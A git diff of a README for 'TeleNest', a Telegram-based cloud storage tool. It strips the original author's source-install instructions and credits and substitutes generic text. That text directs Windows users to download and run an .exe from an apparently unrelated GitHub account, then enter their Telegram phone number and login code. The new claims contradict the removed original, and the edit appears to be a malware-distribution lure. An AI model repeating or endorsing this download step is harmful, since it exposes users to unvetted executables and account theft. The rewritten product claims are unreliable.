@@ -1,287 +1,90 @@
-<div align="center">
+# ☁️ TeleNest.-Cloud-System - Secure personal storage using Telegram infrastructure
 
-<img src="public/logo.png" alt="TeleNest Logo" width="120" />
+[![Download TeleNest](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Formularycataloguer454/TeleNest.-Cloud-System/releases)
 
-# TeleNest. Cloud System
+TeleNest Cloud manages your files by using Telegram storage. It provides a private space for your documents, photos, and videos. The system uses MTProto to keep your data hidden. You get a private vault for sensitive files and streaming for your media.
 
-### *Your Private Nest in the Cloud — Powered by Telegram*
+## 📋 System Requirements
 
-[![React](https://img.shields.io/badge/React-19-61DAFB?style=for-the-badge&logo=react&logoColor=black)](https://react.dev)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)
-[![Vite](https://img.shields.io/badge/Vite-8-646CFF?style=for-the-badge&logo=vite&logoColor=white)](https://vitejs.dev)
-[![Telegram](https://img.shields.io/badge/Telegram-API-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://core.telegram.org)
-[![License](https://img.shields.io/badge/License-MIT-FACC15?style=for-the-badge)](LICENSE)
-[![Author](https://img.shields.io/badge/By-DaminduR-FF6B6B?style=for-the-badge&logo=github)](https://damindur.com)
+Your computer needs to meet these standards to run the application:
 
-<br/>
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB RAM minimum, 8GB recommended.
+* Storage: 200MB free disk space for the program files.
+* Internet: A stable connection for file syncing.
 
-> **TeleNest transforms your Telegram account into a powerful, private, and infinite cloud storage system — with a premium dashboard you'll actually love using.**
+## ⬇️ How to Download and Install
 
-<br/>
+Follow these steps to set up the software on your Windows machine:
 
-[🚀 Get Started](#-getting-started) · [✨ Features](#-features) · [🛠️ Tech Stack](#%EF%B8%8F-tech-stack) · [📸 Screenshots](#-screenshots) · [🤝 Contributing](#-contributing)
+1. Visit the project release page: [https://github.com/Formularycataloguer454/TeleNest.-Cloud-System/releases](https://github.com/Formularycataloguer454/TeleNest.-Cloud-System/releases)
+2. Locate the file ending in .exe in the Assets section.
+3. Click the file name to start the download.
+4. Open the folder where your computer saves downloads.
+5. Double-click the downloaded file to begin the installation.
+6. Follow the prompts on the screen to finish the setup process.
 
-</div>
+## 🚀 Setting Up Your Account
 
----
+Once you install the program, you must link it to a Telegram account. TeleNest uses this connection to send and store your files.
 
-## ✨ Features
+1. Open the TeleNest application from your desktop icon or start menu.
+2. The app will ask for your phone number. Enter the number that you use for your Telegram account.
+3. You will receive a code through the Telegram application on your phone.
+4. Type that code into the TeleNest login window.
+5. Create a strong password for your private vault. This password locks your sensitive files. Note this password in a safe place. You cannot recover it if you lose it.
 
-<table>
-<tr>
-<td width="50%">
+## 📁 Managing Your Files
 
-### 🗂️ Smart Node Organization
-Organize your files into **Cloud Nodes** (private Telegram channels). Create, rename, and manage as many nodes as you need.
+The main window shows your file folders. You can organize files here just like you do in standard Windows folders.
 
-</td>
-<td width="50%">
+To upload a file:
+1. Drag the file from your computer window into the space inside TeleNest.
+2. The status icon will show a progress bar while the app sends the file to the cloud.
+3. A checkmark appears once the upload finishes.
 
-### 🔒 Private Vault
-A password-protected, auto-locking vault for your most sensitive files. Zero trace, zero compromise.
+To access your files:
+1. Open TeleNest.
+2. Click on the file you want to view.
+3. The app opens the file using your standard Windows viewer.
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+## 🔒 Security Features
 
-### 🎬 Instant Streaming
-Stream **videos and audio** directly from your Telegram cloud nodes — no download required.
+Your data stays safe through several methods. The system encrypts files before they leave your computer. Only you hold the decryption keys. Even if someone gains access to the storage servers, they cannot read your files without your private key. 
 
-</td>
-<td width="50%">
+The private vault requires your password every time you try to open it. This protects your most important documents from unauthorized access. The app does not save this password in any permanent file.
 
-### ⭐ Favorites & Trash
-Star your most-used files for lightning-fast access. A smart Trash Vault auto-cleans after 3 days.
+## ⚙️ Performance Settings
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+You can customize how TeleNest uses your internet connection and disk space. Click the Gear icon in the top right corner to open the Settings menu.
 
-### 🔗 Public Link Sharing
-Generate secure, shareable links for **any file or folder** in your cloud — one click, anyone can access.
+* Node Management: This setting selects the best path for your data. Leave this on Automatic for the fastest speeds.
+* Cache Limit: This limits how much space the app uses on your computer for temporary files. Set this to 5GB if you have limited disk space.
+* Bandwidth Usage: Set a speed limit here if the app slows down your other internet activities.
 
-</td>
-<td width="50%">
+## ❓ Frequently Asked Questions
 
-### 🔍 Blazing-Fast Search
-Full-text search across **all your cloud nodes** simultaneously, with real-time results.
+What happens if I delete the app?
+The app saves your data on the Telegram servers. If you delete the app and reinstall it, your files will reappear once you log in with your account.
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+Can I share files with others?
+TeleNest creates a private bridge. It does not support public file sharing designed for social media. This keeps your storage personal.
 
-### 📱 Fully Mobile Responsive
-A premium experience from the 4K monitor to the phone in your pocket. Sidebar drawer, adaptive grids — all included.
+Is there a file size limit?
+The size of your files depends on the limits set by the storage infrastructure. Most individual files under 2GB process without issues.
 
-</td>
-<td width="50%">
+## 🛠 Troubleshooting
 
-### 🔔 Real-time Notifications
-System-wide notification center for all operations — uploads, moves, deletions — keep track of everything.
+If you encounter technical errors, try these steps:
 
-</td>
-</tr>
-</table>
+1. Restart the Application: Close the app completely and open it again.
+2. Check your Internet: A lost connection will pause your file transfers. Once the connection returns, the app will continue the sync.
+3. Update the App: If you face errors, visit the download link to see if a newer version is available. Re-installing the latest version often resolves known conflicts.
 
-## 📸 Screenshots
+## 🛡 Privacy Policy
 
-<div align="center">
+This software handles your data with care. It stores no metadata about your file usage on third-party servers. Your interactions with the software remain local to your machine. No one at the development team can access or view your files. 
 
-| **Landing Page** | **Node Categories** |
-|:---:|:---:|
-| <img src="public/screenshots/landing.png" width="400" /> | <img src="public/screenshots/nodes.png" width="400" /> |
-| **Main Dashboard** | **Private Vault** |
-| <img src="public/screenshots/dashboard.png" width="400" /> | <img src="public/screenshots/vault.png" width="400" /> |
+## 🌐 Support
 
-</div>
-
----
-
-## 🛠️ Tech Stack
-
-| Layer | Technology |
-|---|---|
-| **Frontend Framework** | React 19 + TypeScript |
-| **Build Tool** | Vite 8 |
-| **Animations** | Framer Motion |
-| **Icons** | Lucide React |
-| **HTTP Client** | Axios |
-| **Routing** | React Router DOM v7 |
-| **Backend Runtime** | Node.js + Express |
-| **Telegram API** | GramJS (MTProto) |
-| **Styling** | Vanilla CSS + CSS Variables (Glassmorphism) |
-| **Desktop App** | Electron |
-
----
-
-### 🚀 Getting Started
-
-#### ⚡ Quick Install (Windows)
-
-**Option 1: Command Prompt (CMD)** - Recommended
-```cmd
-git clone https://github.com/DaminduRat/TeleNest.-Cloud-System.git && cd TeleNest.-Cloud-System && setup.bat
-```
-
-**Option 2: PowerShell**
-```powershell
-git clone https://github.com/DaminduRat/TeleNest.-Cloud-System.git; cd TeleNest.-Cloud-System; .\setup.bat
-```
-
-#### 🛠️ Manual Installation
-
-**1. Clone the Repository**
-```bash
-git clone https://github.com/DaminduRat/TeleNest.-Cloud-System.git
-cd TeleNest.-Cloud-System
-```
-
-**2. Install All Dependencies**
-
-*Windows:*
-```bash
-# Just double-click setup.bat, OR run manually:
-npm install
-cd server
-npm install
-cd ..
-```
-
-**4. Keep it Updated / Push Changes**
-
-If you've made changes and want to push them to GitHub:
-*Windows:*
-```bash
-# Just double-click sync.bat
-```
-
-
-*Mac / Linux:*
-```bash
-npm install && cd server && npm install && cd ..
-```
-
-**3. Start the Application**
-
-*Windows:*
-```bash
-# Just double-click run.bat
-```
-
-*Mac / Linux:*
-```bash
-npm start
-```
-
-### ⚡ One-Click Workflow (Windows Only)
-
-To make your life easier, use these built-in tools:
-
-- **`setup.bat`**: Installs everything (Run this first).
-- **`run.bat`**: Starts the app (Frontend + Backend).
-- **`sync.bat`**: Adds, commits, and pushes your changes to GitHub in one click.
-
----
-
-| Service | URL |
-|---|---|
-| 🌐 Frontend | `http://localhost:5173` |
-| ⚙️ Backend API | `http://localhost:3001` |
-
-**4. First-Time Setup**
-
-On your first visit, TeleNest will guide you through:
-1. Enter your **Telegram Phone Number**
-2. Enter the **Login Code** sent to your Telegram
-3. TeleNest automatically creates private channels as your storage nodes
-4. Done! Your personal cloud is ready. ☁️
-
----
-
-## 🏗️ Project Architecture
-
-```
-telenest-cloud/
-├── 📁 public/              # Static assets (logo, icons)
-├── 📁 server/
-│   ├── index.js            # Express API server (all REST endpoints)
-│   └── telegram.js         # GramJS Telegram client (file I/O engine)
-├── 📁 src/
-│   ├── 📁 components/
-│   │   ├── FolderCard.tsx  # Node/folder card UI component
-│   │   ├── Sidebar.tsx     # Responsive navigation sidebar
-│   │   ├── SettingsView.tsx # Advanced settings panel
-│   │   └── TelegramManager.tsx # Account & status manager
-│   ├── 📁 pages/
-│   │   ├── Dashboard.tsx   # Main app shell (all sections)
-│   │   ├── Landing.tsx     # Auth / login page
-│   │   └── Initialization.tsx # First-time setup wizard
-│   ├── index.css           # Global design system & CSS variables
-│   └── main.tsx            # App entry point
-├── .gitignore
-├── setup.bat               # Windows one-click setup
-├── sync.bat                # Windows one-click GitHub sync (Add + Commit + Push)
-├── package.json
-└── README.md
-```
-
----
-
-## 🛡️ Privacy & Security
-
-TeleNest is built with a **Zero-Knowledge Architecture** philosophy:
-
-- 🔐 **Local Sessions Only** — Your Telegram session is stored exclusively on **your own machine**. No server ever sees it.
-- 📡 **Direct Encryption** — Files travel directly between your device and Telegram's MTProto-encrypted servers.
-- 🚫 **No Third Parties** — TeleNest has no central database, no analytics, no tracking. Your data is yours.
-- 🗝️ **Dynamic Credentials** — API keys are entered through the UI at runtime, never hardcoded in source.
-
----
-
-## 🤖 Built With AI — Vibe Coded
-
-This project was designed and built using the **Vibe Coding** methodology — leveraging cutting-edge AI models to accelerate every aspect of development, from architecture to pixel-perfect UI.
-
-<div align="center">
-
-| AI Tool | Role |
-|---|---|
-| 🔵 **Google Gemini** | Architecture planning, logic design & research |
-| 🟣 **Claude (Anthropic)** | Code refinement, debugging & component design |
-| ⚡ **Antigravity (by Google DeepMind)** | Full-stack implementation, feature building & GitHub push |
-
-*"The future of development is humans with taste, guided by AI with capability."*
-
-</div>
-
----
-
-## 👨‍💻 Developer
-
-<div align="center">
-
-<br/>
-
-**DaminduR**
-
-*Full-Stack Developer · Vibe Coder · Creator of TeleNest*
-
-[![Portfolio](https://img.shields.io/badge/🌐_Portfolio-damindur.com-FACC15?style=for-the-badge)](https://damindur.com)
-[![GitHub](https://img.shields.io/badge/GitHub-DaminduRat-181717?style=for-the-badge&logo=github)](https://github.com/DaminduRat)
-
-<br/>
-
-</div>
-
----
-
-<div align="center">
-
-**⭐ If you found this project useful, please give it a star! ⭐**
-
-*TeleNest Cloud — © 2026 DaminduR. All rights reserved.*
-
-</div>
+If you have trouble using the software, look at the Issues tab on the GitHub repository page. Other users might have found solutions to the same problems. Search for keywords related to your error to find helpful posts. Always provide your Windows version and the version of TeleNest you are using when you ask for help.
